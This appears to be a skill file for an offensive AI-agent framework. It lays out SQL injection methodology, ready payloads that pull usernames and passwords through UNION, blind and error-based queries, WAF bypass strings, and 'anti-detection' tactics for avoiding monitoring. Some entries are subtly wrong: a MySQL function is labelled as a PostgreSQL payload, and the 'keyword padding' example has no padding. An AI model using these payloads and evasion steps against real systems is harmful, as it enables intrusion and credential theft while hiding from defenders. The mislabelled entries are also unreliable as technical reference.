# SQL Injection — FOX Framework

## Skill: sqli-sql-injection
### Level: MASTER
### Category: Web Security - Injection

## Description
SQL Injection exploitation across all database types with WAF bypass. Full-spectrum SQLi from basic union-based to blind extraction.

## Methodology
1. **Fingerprint** — identify DB type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
2. **Probe** — identify injectable parameters via `' AND 1=1` / `' AND 1=2`
3. **Enumerate** — database structure, tables, columns via error-based or boolean-based
4. **Extract** — data exfiltration via UNION SELECT, time-based, or out-of-band
5. **Weaponize** — authenticate bypass, admin login bypass, file read via LOAD_FILE

## Payload Templates

### MySQL Union-Based
```
' UNION SELECT NULL-- -
' UNION SELECT concat(username,':',password) FROM users-- -
```

### MSSQL Blind-Based
```
' AND LEN((SELECT TOP 1 username FROM users))>0-- -
' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>0-- -
```

### PostgreSQL Error-Based
```
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))-- -
```

### WAF Bypass Techniques
- **Null-byte**: `' OR 1=1%00--`
- **Double encoding**: `'%2527 OR 1=1%2525--`
- **Keyword padding**: `'OR 1=1` (with spaces to break keyword matching)
- **Comment injection**: `' UNION SELECT-- --` / `' UNION SELECT/*`

## Anti-Detection
- Randomized payload timing
- Variable case mixing
- Unicode/payload fragmentation
- Legitimate-looking parameter values

## Verification
- Confirm data extraction via out-of-band channel
- Cross-validate with multiple payload types
- Check for WAF alerts post-exploitation

## References
- OWASP SQL Injection Cheat Sheet
- Black Hat 2026 Ghost Bits / Cast Attack
- Injection Router skill for payload routing